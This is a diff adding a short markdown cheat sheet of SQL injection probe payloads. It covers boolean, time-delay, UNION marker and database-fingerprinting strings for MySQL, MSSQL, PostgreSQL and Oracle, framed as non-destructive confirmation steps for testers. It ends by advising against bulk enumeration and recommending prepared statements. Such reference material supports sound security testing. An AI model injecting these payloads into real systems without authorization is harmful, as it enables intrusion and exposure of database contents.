@@ -1,0 +1,64 @@
+---
+Vulnerability: SQLi
+Category: Payload
+DB: Generic
+---
+# SQLi Quickstart Payloads
+
+> Minimal, non‑destructive probes to confirm SQLi across engines. Start here before deep enumeration.
+
+==============================
+A) Stabilize Context
+==============================
+- Try comment styles: `-- -`, `#` (MySQL), `/* */`.
+- Identify param type: string (`'`) vs numeric.
+- Use a unique marker: `q9xZ2025`.
+
+==============================
+B) Boolean Flip (content delta)
+==============================
+```
+' AND 1=1 -- -
+' AND 1=2 -- -
+```
+
+==============================
+C) Time Blip (latency delta)
+==============================
+```
+-- MySQL:      ' AND SLEEP(2) -- -
+-- MSSQL:      '; WAITFOR DELAY '0:0:2';--
+-- PostgreSQL: ' AND pg_sleep(2) -- -
+-- Oracle:     ' AND dbms_pipe.receive_message(''a'',2) -- -
+```
+
+==============================
+D) UNION Marker (printable column)
+==============================
+(assume 3 columns; move marker)
+```
+' UNION ALL SELECT 1,'q9xZ2025',3 -- -
+```
+
+==============================
+E) Engine Fingerprint
+==============================
+```
+-- MySQL
+' UNION ALL SELECT 1,version(),3 -- -
+
+-- MSSQL
+' UNION ALL SELECT 1,@@version,3--
+
+-- PostgreSQL
+' UNION ALL SELECT 1,version(),3 -- -
+
+-- Oracle
+' UNION ALL SELECT 1,user,3 FROM dual -- -
+```
+
+==============================
+F) Stop Conditions
+==============================
+- Proof obtained (boolean/time/marker). Do **not** bulk enumerate.
+- Document parameter, payload, engine, and propose prepared statements + allowlists.
